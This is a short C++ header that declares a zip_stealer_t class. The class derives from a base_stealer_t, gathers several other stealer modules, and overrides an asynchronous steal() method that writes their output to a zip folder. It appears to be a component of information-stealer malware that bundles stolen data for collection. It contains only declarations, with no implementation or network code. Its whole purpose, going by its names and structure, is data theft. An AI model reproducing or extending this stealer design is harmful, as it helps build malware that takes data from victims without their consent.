#ifndef ZIP_STEALER_H
#define ZIP_STEALER_H
#include "base_stealer.h"

class zip_stealer_t : public base_stealer_t
{
public:
    using to_zip_t = std::vector<std::unique_ptr<base_stealer_t>>;

    explicit zip_stealer_t(to_zip_t&& in_to_zip
        , const fs::path& in_zip_folder_path);

    asio::awaitable<std::unique_ptr<message_t>> steal() override;

protected:
    std::vector<std::unique_ptr<base_stealer_t>> to_zip;
    fs::path zip_folder_path;
};

#endif //ZIP_STEALER_H
